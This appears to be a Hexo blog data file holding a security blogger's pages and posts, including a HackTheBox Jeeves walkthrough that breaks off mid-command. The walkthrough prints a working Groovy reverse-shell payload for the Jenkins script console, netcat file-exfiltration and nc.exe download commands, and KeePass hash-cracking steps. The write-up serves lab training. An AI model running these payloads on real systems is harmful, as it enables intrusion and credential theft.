{"meta":{"version":1,"warehouse":"5.0.1"},"models":{"Asset":[{"_id":"themes/zen/source/css/olive-theme.css","path":"css/olive-theme.css","modified":0,"renderable":1},{"_id":"themes/zen/source/css/style.min.css","path":"css/style.min.css","modified":0,"renderable":1},{"_id":"themes/zen/source/js/twikoo.all.min.js","path":"js/twikoo.all.min.js","modified":0,"renderable":1},{"_id":"themes/zen/source/css/partial/atom-one-dark.min.css","path":"css/partial/atom-one-dark.min.css","modified":0,"renderable":1},{"_id":"themes/zen/source/css/partial/prism.css","path":"css/partial/prism.css","modified":0,"renderable":1}],"Cache":[{"_id":"source/_posts/2021-12-12-HackTheBox StartingPoint Review.md","hash":"4b2f7c1170034937827e289f6d97b20e51bf008a","modified":1721838044838},{"_id":"source/_posts/2021-12-18-Jeeves HackTheBox.md","hash":"f4deb6c0a1e3647a251973099599cf3b069fea11","modified":1721838044838},{"_id":"source/_posts/2021-12-19-Hacker101 CTF.md","hash":"f00ee5ada8205474774f7a90618a9683bcaedc1f","modified":1721838044838},{"_id":"source/_posts/2021-12-8-Learning to Solve basic Crackme's with Pwnable.kr.md","hash":"5e034d07c2bbc7e3299e90ea063121ce9e33f58d","modified":1721838044834},{"_id":"source/_posts/2021-12-8-Microsoft Ignite Security Operations Analyst Challenge.md","hash":"73a3ded30bea16bde0fc68469373e05158df6726","modified":1721838044834},{"_id":"source/_posts/2021-12-19-TCM PEH Course Review+AD Notes.md","hash":"f58e904e394b7a0d06a52011fdb41faec19747aa","modified":1721838044838},{"_id":"source/_posts/2021-12-8-SLAE x86 Assembly and Shellcoding on Linux Notes.md","hash":"d63d22bb00b79a0e19b151076033c9069e2edebe","modified":1721838044834},{"_id":"source/_posts/2021-12-8-Windows Subsystem for Linux (WSL) Workflow.md","hash":"f61eb8a8755e974d8bbc59726f1dc2b95ff0dde2","modified":1721838044838},{"_id":"source/_posts/2021-12-8-Playing with a Chinese PoC for a VMware CVE! (For fun and ZERO profit.md","hash":"47841a19081d1cdb9a1d2214c51784709630611a","modified":1721838044834},{"_id":"source/_posts/2021-12-9-Leaked Babuk Ransomware Builder Fun.md","hash":"72616e3965962616420619da564a33e635504ed7","modified":1721838044838},{"_id":"source/_posts/2022-7-25-Passage_HackTheBox.md","hash":"0f23baabad8b5baa59792e7fad583dbec10d7bec","modified":1721838044842},{"_id":"source/_posts/2022-12-5-Personal-Course-Compendium-(PCC).md","hash":"020b727b2ee53aa45843d094e90224768c2f3e6f","modified":1721838044842},{"_id":"source/_posts/2022-9-22-Vulnerable-Web-Apps-Overview.md","hash":"7558eb2f9bbafc457c003bee51fa41af432c9ded","modified":1721838044842},{"_id":"source/_posts/2022-7-7-Sektor7 Malware Development Course.md","hash":"52f64401ec6fc7711feb5d5febe336a91ac63b68","modified":1721838044842},{"_id":"source/_posts/2022-9-19-TCM-PNPT-Certification-Review.md","hash":"efbdd7c0bb022b23786d8540227ae0416c985910","modified":1721838044842},{"_id":"source/_posts/2023-2-25-PLC-Web-Server-Authenticated-Arbitrary-File-Download.md","hash":"f975efd5bd0e7b457f96e49b8d02471addf8d49e","modified":1721838044842},{"_id":"source/_posts/hello-world.md","hash":"7d98d6592de80fdcd2949bd7401cec12afd98cdf","modified":1721837405302},{"_id":"themes/zen/layout/categories.ejs","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1721837483882},{"_id":"themes/zen/source/css/partial/prism.css","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1721841619637},{"_id":"themes/zen/README.md","hash":"60ea9dc5c11c389fd4dac369502fef8a54fd8cc6","modified":1721837483882},{"_id":"themes/zen/LICENSE","hash":"6edfe3d53b1b6d64b342310f27fc3380f0b01798","modified":1721837483882},{"_id":"themes/zen/layout/404.ejs","hash":"eedfc2cc495c2aa7065fb8e6ec44073cff83d9f0","modified":1721837483882},{"_id":"themes/zen/layout/index.ejs","hash":"d288e6f2612c0cccf5d99eca51b78af3583dda41","modified":1721837483882},{"_id":"themes/zen/layout/layout.ejs","hash":"9b1d4de93a4596274b562277e7ec78628a6891e2","modified":1722184601428},{"_id":"themes/zen/layout/post.ejs","hash":"47a5c7d456b95b89a73e08b0d91c267af4b8a5d2","modified":1721837483886},{"_id":"themes/zen/layout/components/twikoo.ejs","hash":"1f7c9c6f39e36789414c0b2daf1d003c86f0d14b","modified":1721837483882},{"_id":"themes/zen/layout/partial/footer.ejs","hash":"ae85d2c4cabca8e04fdbf67b17b2dd5ef9931e40","modified":1721867539693},{"_id":"themes/zen/layout/partial/head.ejs","hash":"08b14057f270febf37ab4981ccfff1f7b2d67a10","modified":1721855029046},{"_id":"themes/zen/layout/partial/header.ejs","hash":"a618dd5ddc80140a48d3ded5c629b5743002fe46","modified":1721855910805},{"_id":"themes/zen/source/css/olive-theme.css","hash":"6480994e808034eb56801c77cb1e1dc46df59c26","modified":1721855214525},{"_id":"themes/zen/source/css/style.min.css","hash":"cdb04c994134d36f5297c2ddc275c19398072d7a","modified":1721855209389},{"_id":"themes/zen/source/css/partial/atom-one-dark.min.css","hash":"56dddcd32332b54853ba9eadba3c883f95f00275","modified":1721845285424},{"_id":"themes/zen/source/js/twikoo.all.min.js","hash":"871efb3c5feb625bd87a398ea1133d552e487588","modified":1721837483902},{"_id":"source/whoami.md","hash":"520bac6b3a7f54a5aafd63b6fc5cfb26f68ca76a","modified":1722184960440},{"_id":"source/whoami.html","hash":"d6bab45f44c33d276cc8a91c87f73fc31bd6936b","modified":1721870384432},{"_id":"source/CV.md","hash":"c472346c9294945c72d85c05a165364fb0ff4869","modified":1722184741924},{"_id":"source/contact.md","hash":"49ea0b2cc4377e31a058134fb9384909710cc9d9","modified":1721870523348},{"_id":"source/projects.md","hash":"8d782111d436efb0130d4cc06a081a9878bb6533","modified":1722184522404}],"Category":[],"Data":[],"Page":[{"title":"CV","subtitle":"","_content":"\nContact me!","source":"CV.md","raw":"---\ntitle: \"CV\"\nsubtitle: \"\"\n---\n\nContact me!","date":"2024-07-28T16:39:01.924Z","updated":"2024-07-28T16:39:01.924Z","path":"CV.html","_id":"clz0l7f3s0000dtcp478148gn","comments":1,"layout":"page","content":"<p>Contact me!</p>\n","excerpt":"","more":"<p>Contact me!</p>\n"},{"title":"whoami","subtitle":"","_content":"\nHey, I’m Thomas.\n\nI am currently working as a red team operator for a Fortune 100 financial institution. At 21 years old and based on the East Coast, I’ve dedicated the past few years to honing my craft.\n\nThis page is a space where I’ll share my learning experiences, challenges, projects, and research endeavors. I hope you enjoy the posts and hopefully learn something new.\n\nFeedback is always welcome and appreciated!\n\n\nYou can reach me at:\n<a href=\"https://x.com/TKYNSEC\">x.com/TKYNSEC</a>\nDiscord: <a href=\"https://discord.com/users/mangotakyon\">mangotakyon</a>\nLinkedin: <a href=\"https://www.linkedin.com/in/thomas-keeferiii/\">linkedin.com/in/thomas-keeferiii/</a>\n\n\n\n","source":"whoami.md","raw":"---\ntitle: \"whoami\"\nsubtitle: \"\"\n---\n\nHey, I’m Thomas.\n\nI am currently working as a red team operator for a Fortune 100 financial institution. At 21 years old and based on the East Coast, I’ve dedicated the past few years to honing my craft.\n\nThis page is a space where I’ll share my learning experiences, challenges, projects, and research endeavors. I hope you enjoy the posts and hopefully learn something new.\n\nFeedback is always welcome and appreciated!\n\n\nYou can reach me at:\n<a href=\"https://x.com/TKYNSEC\">x.com/TKYNSEC</a>\nDiscord: <a href=\"https://discord.com/users/mangotakyon\">mangotakyon</a>\nLinkedin: <a href=\"https://www.linkedin.com/in/thomas-keeferiii/\">linkedin.com/in/thomas-keeferiii/</a>\n\n\n\n","date":"2024-07-29T21:22:05.856Z","updated":"2024-07-29T21:22:05.856Z","path":"whoami.html","_id":"clz0l7x5o0001dtcpcrokehga","comments":1,"layout":"page","content":"<p>Hey, I’m Thomas.</p>\n<p>I am currently working as a red team operator for a Fortune 100 financial institution. At 21 years old and based on the East Coast, I’ve dedicated the past few years to honing my craft.</p>\n<p>This page is a space where I’ll share my learning experiences, challenges, projects, and research endeavors. I hope you enjoy the posts and hopefully learn something new.</p>\n<p>Feedback is always welcome and appreciated!</p>\n<p>You can reach me at:<br><a href=\"https://x.com/TKYNSEC\">x.com&#x2F;TKYNSEC</a><br>Discord: <a href=\"https://discord.com/users/mangotakyon\">mangotakyon</a><br>Linkedin: <a href=\"https://www.linkedin.com/in/thomas-keeferiii/\">linkedin.com&#x2F;in&#x2F;thomas-keeferiii&#x2F;</a></p>\n","excerpt":"","more":"<p>Hey, I’m Thomas.</p>\n<p>I am currently working as a red team operator for a Fortune 100 financial institution. At 21 years old and based on the East Coast, I’ve dedicated the past few years to honing my craft.</p>\n<p>This page is a space where I’ll share my learning experiences, challenges, projects, and research endeavors. I hope you enjoy the posts and hopefully learn something new.</p>\n<p>Feedback is always welcome and appreciated!</p>\n<p>You can reach me at:<br><a href=\"https://x.com/TKYNSEC\">x.com&#x2F;TKYNSEC</a><br>Discord: <a href=\"https://discord.com/users/mangotakyon\">mangotakyon</a><br>Linkedin: <a href=\"https://www.linkedin.com/in/thomas-keeferiii/\">linkedin.com&#x2F;in&#x2F;thomas-keeferiii&#x2F;</a></p>\n"},{"title":"projects","subtitle":"","_content":"### Coming soon! ###\n\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣄⣀⣀⣠⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⢿⣿⣿⡿⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣶⣤⣤⣤⣤⣤⣤⣶⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⣀⣠⣤⡖⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢶⣤⣄⣀⠀⠀⠀⠀\n⠀⠀⠀⠉⠙⠻⢿⣿⡀⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⢀⣿⡿⠟⠋⠉⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠢⠤⣤⣀⣈⣁⣀⣤⠤⠔⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n","source":"projects.md","raw":"---\n\ntitle: \"projects\"\n\nsubtitle: \"\"\n\n---\n### Coming soon! ###\n\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣄⣀⣀⣠⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⢿⣿⣿⡿⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣶⣤⣤⣤⣤⣤⣤⣶⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⣀⣠⣤⡖⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢶⣤⣄⣀⠀⠀⠀⠀\n⠀⠀⠀⠉⠙⠻⢿⣿⡀⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⢀⣿⡿⠟⠋⠉⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠢⠤⣤⣀⣈⣁⣀⣤⠤⠔⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n","date":"2024-07-28T16:35:22.404Z","updated":"2024-07-28T16:35:22.404Z","path":"projects.html","_id":"clz5rwzlu0000ixcp9t79dybs","comments":1,"layout":"page","content":"<h3 id=\"Coming-soon\"><a href=\"#Coming-soon\" class=\"headerlink\" title=\"Coming soon!\"></a>Coming soon!</h3><p>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣄⣀⣀⣠⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⢿⣿⣿⡿⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣶⣤⣤⣤⣤⣤⣤⣶⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⣀⣠⣤⡖⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢶⣤⣄⣀⠀⠀⠀⠀<br>⠀⠀⠀⠉⠙⠻⢿⣿⡀⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⢀⣿⡿⠟⠋⠉⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠢⠤⣤⣀⣈⣁⣀⣤⠤⠔⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</p>\n","excerpt":"","more":"<h3 id=\"Coming-soon\"><a href=\"#Coming-soon\" class=\"headerlink\" title=\"Coming soon!\"></a>Coming soon!</h3><p>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣄⣀⣀⣠⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⢿⣿⣿⡿⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣶⣤⣤⣤⣤⣤⣤⣶⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⣀⣠⣤⡖⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢶⣤⣄⣀⠀⠀⠀⠀<br>⠀⠀⠀⠉⠙⠻⢿⣿⡀⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⢀⣿⡿⠟⠋⠉⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠢⠤⣤⣀⣈⣁⣀⣤⠤⠔⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀<br>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</p>\n"}],"Post":[{"layout":"single","title":"HackTheBox StartingPoint Review","date":"2021-12-12T05:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":" \n\n## Review\nI completed the Starting Point track from HackTheBox. It builds off of the principles that you learn in the Academy which I also finished. \nYou can see my review here -> <http://tkyn.dev/HackTheBox-Academy-Review> (article not written yet)\n\nIt took my a little over 7 hours of work. I spread these sessions out in 2-3 hour blocks. \n\nIf you read over the walkthroughs, have gone through the accompanying academy modules, and have a tiny bit of previous experience you will power straight through this.\n\nLooking at it from a beginners standpoint (who this is made for) it seems like a very polished introduction to the very basics of pentesting.\nI did it for free without the subscription <https://twitter.com/hackthebox_eu/status/1468234356791599113>\n\n\"December is a GREAT month to start learning #cybersecurity! \nSpeaker with three sound waves Until Dec 31 ALL 16 Starting Point Machines are FREE-TO-PLAY for everyone\nWrapped present Complete all tasks & get rewarded with a 25% OFF on our monthly VIP+ subscription\nStart #hacking now: https://hackthebox.com\"\n\n## PROOF\n\n![](/assets/images/Startingpoint-Academy/startingpoint.PNG)\n \n![](/assets/images/Startingpoint-Academy/startingpoint2.PNG)\n\n![](/assets/images/Startingpoint-Academy/startingpoint3.PNG)\n\n![](/assets/images/Startingpoint-Academy/startingpoint4.PNG)\n\n\n","source":"_posts/2021-12-12-HackTheBox StartingPoint Review.md","raw":"---\nlayout: single\ntitle:  HackTheBox StartingPoint Review\ndate: 2021-12-12\nclasses: wide\nheader:\n  teaser: \ntags:\n  - ctf\n  - Certification\n--- \n\n## Review\nI completed the Starting Point track from HackTheBox. It builds off of the principles that you learn in the Academy which I also finished. \nYou can see my review here -> <http://tkyn.dev/HackTheBox-Academy-Review> (article not written yet)\n\nIt took my a little over 7 hours of work. I spread these sessions out in 2-3 hour blocks. \n\nIf you read over the walkthroughs, have gone through the accompanying academy modules, and have a tiny bit of previous experience you will power straight through this.\n\nLooking at it from a beginners standpoint (who this is made for) it seems like a very polished introduction to the very basics of pentesting.\nI did it for free without the subscription <https://twitter.com/hackthebox_eu/status/1468234356791599113>\n\n\"December is a GREAT month to start learning #cybersecurity! \nSpeaker with three sound waves Until Dec 31 ALL 16 Starting Point Machines are FREE-TO-PLAY for everyone\nWrapped present Complete all tasks & get rewarded with a 25% OFF on our monthly VIP+ subscription\nStart #hacking now: https://hackthebox.com\"\n\n## PROOF\n\n![](/assets/images/Startingpoint-Academy/startingpoint.PNG)\n \n![](/assets/images/Startingpoint-Academy/startingpoint2.PNG)\n\n![](/assets/images/Startingpoint-Academy/startingpoint3.PNG)\n\n![](/assets/images/Startingpoint-Academy/startingpoint4.PNG)\n\n\n","slug":"2021-12-12-HackTheBox StartingPoint Review","published":1,"updated":"2024-07-24T16:20:44.838Z","comments":1,"photos":[],"_id":"clz07c5iz0000m3cp2ovgaldd","content":"<h2 id=\"Review\"><a href=\"#Review\" class=\"headerlink\" title=\"Review\"></a>Review</h2><p>I completed the Starting Point track from HackTheBox. It builds off of the principles that you learn in the Academy which I also finished.<br>You can see my review here -&gt; <a href=\"http://tkyn.dev/HackTheBox-Academy-Review\">http://tkyn.dev/HackTheBox-Academy-Review</a> (article not written yet)</p>\n<p>It took my a little over 7 hours of work. I spread these sessions out in 2-3 hour blocks. </p>\n<p>If you read over the walkthroughs, have gone through the accompanying academy modules, and have a tiny bit of previous experience you will power straight through this.</p>\n<p>Looking at it from a beginners standpoint (who this is made for) it seems like a very polished introduction to the very basics of pentesting.<br>I did it for free without the subscription <a href=\"https://twitter.com/hackthebox_eu/status/1468234356791599113\">https://twitter.com/hackthebox_eu/status/1468234356791599113</a></p>\n<p>“December is a GREAT month to start learning #cybersecurity!<br>Speaker with three sound waves Until Dec 31 ALL 16 Starting Point Machines are FREE-TO-PLAY for everyone<br>Wrapped present Complete all tasks &amp; get rewarded with a 25% OFF on our monthly VIP+ subscription<br>Start #hacking now: <a href=\"https://hackthebox.com/\">https://hackthebox.com</a>“</p>\n<h2 id=\"PROOF\"><a href=\"#PROOF\" class=\"headerlink\" title=\"PROOF\"></a>PROOF</h2><p><img src=\"/assets/images/Startingpoint-Academy/startingpoint.PNG\"></p>\n<p><img src=\"/assets/images/Startingpoint-Academy/startingpoint2.PNG\"></p>\n<p><img src=\"/assets/images/Startingpoint-Academy/startingpoint3.PNG\"></p>\n<p><img src=\"/assets/images/Startingpoint-Academy/startingpoint4.PNG\"></p>\n","excerpt":"","more":"<h2 id=\"Review\"><a href=\"#Review\" class=\"headerlink\" title=\"Review\"></a>Review</h2><p>I completed the Starting Point track from HackTheBox. It builds off of the principles that you learn in the Academy which I also finished.<br>You can see my review here -&gt; <a href=\"http://tkyn.dev/HackTheBox-Academy-Review\">http://tkyn.dev/HackTheBox-Academy-Review</a> (article not written yet)</p>\n<p>It took my a little over 7 hours of work. I spread these sessions out in 2-3 hour blocks. </p>\n<p>If you read over the walkthroughs, have gone through the accompanying academy modules, and have a tiny bit of previous experience you will power straight through this.</p>\n<p>Looking at it from a beginners standpoint (who this is made for) it seems like a very polished introduction to the very basics of pentesting.<br>I did it for free without the subscription <a href=\"https://twitter.com/hackthebox_eu/status/1468234356791599113\">https://twitter.com/hackthebox_eu/status/1468234356791599113</a></p>\n<p>“December is a GREAT month to start learning #cybersecurity!<br>Speaker with three sound waves Until Dec 31 ALL 16 Starting Point Machines are FREE-TO-PLAY for everyone<br>Wrapped present Complete all tasks &amp; get rewarded with a 25% OFF on our monthly VIP+ subscription<br>Start #hacking now: <a href=\"https://hackthebox.com/\">https://hackthebox.com</a>“</p>\n<h2 id=\"PROOF\"><a href=\"#PROOF\" class=\"headerlink\" title=\"PROOF\"></a>PROOF</h2><p><img src=\"/assets/images/Startingpoint-Academy/startingpoint.PNG\"></p>\n<p><img src=\"/assets/images/Startingpoint-Academy/startingpoint2.PNG\"></p>\n<p><img src=\"/assets/images/Startingpoint-Academy/startingpoint3.PNG\"></p>\n<p><img src=\"/assets/images/Startingpoint-Academy/startingpoint4.PNG\"></p>\n"},{"layout":"single","title":"Jeeves-HackTheBox","date":"2021-12-18T05:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":" \n\n\nJeeves is in reference to a Jenkins server that we will eventually be exploiting. Super fun recap box!\n\n![](/assets/images/Jeeves/jeevessite1.PNG)\nStarting off by scanning ports.\n![](/assets/images/Jeeves/jeevesscan.PNG)\n\nSee there is at least one webserver. Fuzz directories, ran nikto etc. Nothing of real interest there.\nCheck out the second Jetty webserver spotted in the nmap scan. gobuster until we find askjeeves\t\n\n![](/assets/images/Jeeves/jeeves1finsihsed.PNG)\n\nStumble accross the scripting console\n![](/assets/images/Jeeves/jeevescli.PNG)\n\nDo research to find ways to exploit this\nexploit jenkins with groovy script \nhttps://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution\n![](/assets/images/Jeeves/jeevesscript.PNG)\n\n\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy\n\nString host=\"<LOCAL-IP>\";\nint port=1234;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n\n![](/assets/images/Jeeves/jeevesusershell.PNG)  \n  \nWe get a user shell as kohsuke. \nAfter a little bit of recon we come accross CEH.kdbx \n  \nThis file format appears to be a keepass password file. Before we attempt to see the password we have to download the file to our local machine. \n  \n![](/assets/images/Jeeves/jeeveskdbx.PNG)\n\n I achieved this by downloading a netcat executable from the user shell we are in from a python http server that we host.\n  \n\"powershell wget \"http://localip:8000/nc.exe\" -outfile nc.exe\"\nThe virtual machine cannot reach out to github to download the file from there\nThen \"nc -lnvp <port> > CEH.kdbx\" on your local machine and \"nc.exe <local-ip> <same-port> < \"CEH.kdbx\" on the victim machine\n\nWe need a password to open the kdbx file. Why dont we crack it? \nI used this article as guidance, the main points summarized are\n                                                                                               \nhttps://www.rubydevices.com.au/blog/how-to-hack-keepass \ndownload and use keepass2john on the kdbx file.\n\n./keepass2john CEH.kdbx > CEH.hash\nRemove name of keepass database from the new hashfile. \nuse hashcat to crack the file.\n\n./hashcat -m 13400 -a 0 -w 1 CEH.hash <wordlist-file> \n moonshine1 is the password to the keepass file\n  \n ![](/assets/images/Jeeves/jeeveskeepass1.png)\n \n ![](/assets/images/Jeeves/jeeveskeepass2.png)\n \n We find a hash in the keepass file under the title of Backup stuff\n From here I got stuck for a while. While researching I found the tool pth-winexe\n read the docs, run to get admin! \n  \n pth-winexe 